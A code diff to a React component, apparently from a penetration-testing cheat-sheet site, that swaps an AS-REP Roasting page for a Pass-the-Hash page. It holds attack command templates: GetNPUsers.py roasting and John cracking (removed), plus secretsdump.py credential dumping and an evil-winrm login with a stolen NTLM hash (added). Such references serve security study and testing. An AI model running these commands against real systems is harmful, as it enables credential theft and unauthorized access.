@@ -13,7 +13,7 @@ interface IProps {
   title: string;
 }
 
-const AS_REP_Roasting = ({ title }: IProps) => {
+const PassTheHash = ({ title }: IProps) => {
   return (
     <>
       {" "}
@@ -35,23 +35,27 @@ const AS_REP_Roasting = ({ title }: IProps) => {
           >
             <Typography variant="h6">Description</Typography>
             <Typography>
-              If Kerberos Pre-Authentication is Disabled, then AS-REP Roasting
-              is possible.
+              A Pass-the-Hash (PtH) attack is a technique whereby an attacker
+              captures a password hash (as opposed to the password characters)
+              and then simply passes it through for authentication and
+              potentially lateral access to other networked systems. The threat
+              actor doesn’t need to decrypt the hash to obtain a plain text
+              password.
             </Typography>
             <Box sx={{ m: 4 }} />
             <Typography variant="h6">Step 1</Typography>
+            <Typography>
+              This step is not needed, if you have obtained the NTLM hash other
+              way, then you can go straight to step 2. This step is just a
+              common way to dump credentials.
+            </Typography>
             <SyntaxHighlighter className="syntax" language="bash">
-              {"GetNPUsers.py {DOMAIN}/{USER} -dc-ip={IP}"}
-            </SyntaxHighlighter>
-            <Box sx={{ m: 2 }} />
-            <Typography>Perform AS-REP Roasting on a users.txt file</Typography>
-            <SyntaxHighlighter className="syntax" language="bash">
-              {"GetNPUsers.py -usersfile {USERS.txt} -dc-ip {IP} {DOMAIN}/"}
+              {"secretsdump.py {DOMAIN}/{USER}@{IP}"}
             </SyntaxHighlighter>
             <Box sx={{ m: 4 }} />
             <Typography variant="h6">Step 2</Typography>
             <SyntaxHighlighter className="syntax" language="bash">
-              {"john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt"}
+              {"evil-winrm -H {NTLM_HASH} -u administrator -i {IP}"}
             </SyntaxHighlighter>
           </Typography>
         </AccordionDetails>
@@ -60,4 +64,4 @@ const AS_REP_Roasting = ({ title }: IProps) => {
   );
 };
 
-export default AS_REP_Roasting;
+export default PassTheHash;
